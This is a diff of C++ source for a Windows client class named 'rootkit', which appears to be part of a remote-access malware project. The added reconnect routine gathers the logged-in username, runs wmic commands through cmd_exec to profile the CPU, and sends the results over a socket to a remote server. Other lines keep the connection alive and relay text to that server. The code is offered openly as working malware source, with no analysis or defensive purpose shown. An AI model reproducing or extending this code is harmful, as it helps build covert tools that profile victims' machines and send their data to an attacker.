@@ -20,13 +20,13 @@ namespace hardware {
 	}cpu_specs;
 
 	typedef struct {
-		float size;
+		int size;
 		char name[256];
 	}hdd_specs;
 
 	typedef struct {
 		char name[256];
-		float v_ram;
+		int v_ram;
 	}gpu_specs;
 
 	typedef struct {
@@ -34,37 +34,14 @@ namespace hardware {
 		gpu_specs gpu;
 		hdd_specs hdd;
 
-		float ram;		//  physical ram + virtual ram ~= 35gb
+		int ram;		//  physical ram + virtual ram ~= 35gb
 	} client_specs;
 
-	struct user {
+	typedef struct{
 		SOCKET fd;
 		client_specs specs;
 		char username[256];
-	};
-
-	class hardware_info {
-	private:
-		client_specs* specs; // caches client_specs in case of disconnect
-
-	public:
-		hardware_info() :
-			specs(nullptr) {
-		}
-
-		~hardware_info() {
-			delete specs;
-		}
-
-		inline client_specs *get() {
-			if (specs == nullptr) {
-				specs = new client_specs;
-			}
-			else
-				return specs;
-
-		}
-	};
+	} user;
 };
 
 namespace network
@@ -97,13 +74,16 @@ namespace network
 	private:
 		wsa_wrapper _wsa;
 
-		unsigned short _port;		//used for reconnecting purposes
-		char* server_addr;	//same 
 
-		sockaddr_in recvAddr{};
 	public:
 		SOCKET socket_fd;
-		rootkit(const char *host_addr, unsigned short port) : _wsa(), _port(port)
+
+		unsigned short _port;		//used for reconnecting purposes
+		std::string server_addr;	//same 
+
+		sockaddr_in recvAddr{};
+
+		rootkit(const char* host_addr, unsigned short port) : _wsa(), _port(port)
 		{
 			init(host_addr, _port);
 
@@ -113,13 +93,15 @@ namespace network
 				send_text(name);
 			}
 		}
-
-		~rootkit() {
-			delete[] server_addr;
+		~rootkit()
+		{
+			std::cout << "cleanup\n";
+			closesocket(socket_fd);
+			_wsa.cleanup();
 		}
 
 		// max port size is 2*16 anyway so there is no real performance benefit from using 32 bit a register
-		void init(const char *Dst, unsigned short port)
+		void init(const char* Dst, unsigned short port)
 		{
 			recvAddr.sin_family = AF_INET;
 			recvAddr.sin_port = htons(port);
@@ -135,35 +117,6 @@ namespace network
 				*/
 		}
 
-		bool reconnect(const char *server_Dst, unsigned short port)
-		{
-			init(server_Dst, port);
-			while (true)
-			{
-				std::cout << "reconnect" << std::endl;
-				if ((connect(socket_fd, reinterpret_cast<SOCKADDR*>(&recvAddr), sizeof(recvAddr))) != SOCKET_ERROR)
-				{
-					TCHAR usrname[UNLEN]; //16 bit UNICODE characters
-					DWORD usrnamelen = UNLEN;
-
-					if (GetUserName(usrname, &usrnamelen)) {
-						unsigned short sz = WideCharToMultiByte(CP_UTF8, 0, usrname, -1, NULL, 0, NULL, NULL);
-						if (sz > 0 && sz < 255)
-						{
-							char res[255]; //output
-							WideCharToMultiByte(CP_UTF8, 0, usrname, -1, res, sz, NULL, NULL);
-
-							send(socket_fd, res, sz, 0);
-							std::cout << "sending: " << res << std::endl;
-
-							return true;
-						}
-					}
-					return false;
-				}
-			}
-		}
-
 		inline void set_addr(const char* server_Dst, size_t str_size) {
 			void* str_ptr = reinterpret_cast<void*>(&server_Dst);
 			std::memset(str_ptr, 0, str_size);
@@ -173,7 +126,7 @@ namespace network
 		{
 			TCHAR usrname[UNLEN]; //16 bit UNICODE characters
 			DWORD usrnamelen = UNLEN;
-			std::string out;
+			std::string out = "";
 
 			if (GetUserName(usrname, &usrnamelen)) {
 				unsigned short sz = WideCharToMultiByte(CP_UTF8, 0, usrname, -1, NULL, 0, NULL, NULL);
@@ -189,6 +142,41 @@ namespace network
 			return out;
 		}
 
+		bool reconnect(const char* server_Dst, unsigned short port)
+		{
+			init(server_Dst, port);
+			while (true)
+			{
+				std::cout << "reconnect" << std::endl;
+				if ((connect(socket_fd, reinterpret_cast<SOCKADDR*>(&recvAddr), sizeof(recvAddr))) != SOCKET_ERROR)
+				{
+					std::string str_buf = get_name();
+					int i32 = 0;
+					if (str_buf == "")
+						return false;
+					
+					hardware::user buffer;
+					strcpy_s(buffer.username, str_buf.size(), str_buf.c_str());
+					
+					str_buf = cmd_exec("wmic cpu get name");
+					str_buf = str_buf.substr(str_buf.find('\n') + 1);
+					strcpy_s(buffer.specs.cpu.name, str_buf.size(), str_buf.c_str());
+
+					str_buf = cmd_exec("wmic cpu get MaxClockSpeed");
+					i32 = atoi(str_buf.substr(str_buf.find('\n') + 1).c_str());
+					buffer.specs.cpu.clock_speed_ghz = i32;
+
+					str_buf = cmd_exec("wmic cpu get NumberOfCores");
+					i32 = atoi(str_buf.substr(str_buf.find('\n') + 1).c_str());
+					buffer.specs.cpu.core_count = i32;
+
+					send(socket_fd, reinterpret_cast<char*>(&buffer), sizeof(hardware::user), 0);
+
+					return true;
+				}
+			}
+		}
+
 		bool send_text(std::string buffer)
 		{
 			std::cout << "send" << buffer << std::endl;
@@ -199,7 +187,6 @@ namespace network
 				std::cout << "Error: " << _wsa.getError() << std::endl;
 				return false;
 			}
-
 
 			return true;
 		}
@@ -287,16 +274,9 @@ namespace network
 		{
 			if (!(send_text(buffer)))
 			{
-				reconnect();
+				reconnect(this->server_addr.c_str(), this->_port);
 				send_text(buffer);
 			}
-		}
-
-		~rootkit()
-		{
-			std::cout << "cleanup\n";
-			closesocket(socket_fd);
-			_wsa.cleanup();
 		}
 	};
 }
